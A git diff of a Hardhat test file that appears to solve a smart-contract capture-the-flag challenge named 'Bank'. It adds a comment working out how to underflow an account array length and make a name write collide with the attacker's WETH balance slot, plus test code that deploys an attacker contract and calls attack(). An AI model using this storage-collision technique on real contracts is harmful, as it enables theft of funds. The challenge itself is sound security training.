@@ -1,6 +1,20 @@
 const { expect } = require("chai");
 const { ethers } = require("hardhat");
 
+
+{/*
+the main idea is too underflow accounts[msg.sender].length in
+the setAccountName function. 
+setAccountName is writing to the accounts[msg.sender][accountId].accountName slot
+accountStructSlot := keccak(keccak(our_addr . 2)) + 3 * accountId
+accounts[our_address][accountId].balances[WETH]
+balanceSlot := keccak( WETH . [accountStructSlot + 2] )
+balanceSlot := keccak( WETH . [keccak(keccak(our_addr . 2)) + 3 * accountId + 2] )
+accountStructSlot(accountId) == balanceSlot
+<=> keccak(keccak(our_addr . 2)) + 3 * accountId == balanceSlot
+<=> accountId = [balanceSlot - keccak(keccak(our_addr . 2))] / 3
+*/}
+
 describe("[Challenge] Bank", function () {
   let deployer, attacker;
 
@@ -40,13 +54,17 @@ describe("[Challenge] Bank", function () {
 
   });
   it("Exploit", async function() {
-    const bankAttack = await this.bank.connect(attacker)
-    const attackContract = await ( await ethers.getContractFactory("AttackBank", attacker))
-        .deploy(attacker.address, this.weth.address, this.bank.address)
-    // console.log(await attackContract.balanceOf(attacker.address))
-    // console.log("bank", bankAttack.address)
-    // await bankAttack.depositToken(0, attackContract.address, 1)
-    //TODO underflow accounts[msg.sender].length and set it to 2^256 - 1
-    //with help of function setAccountName(uint256 accountId, string name) 
+    const attackerFactory = await ethers.getContractFactory(`BankAttacker`, attacker);
+    attacker = await attackerFactory.deploy(this.bank.address, this.weth.address);
+    try {
+        tx = await attacker.attack({ value: ethers.utils.parseEther(`0.001`) });
+    } catch (error) {
+        attacker = await attackerFactory.deploy(this.bank.address, this.weth.address);
+        tx = await attacker.attack({ value: ethers.utils.parseEther(`0.001`) });
+        await tx.wait();
+    }
   })
 });
+
+
+// accounts[msg.sender][accountId].accountName == 
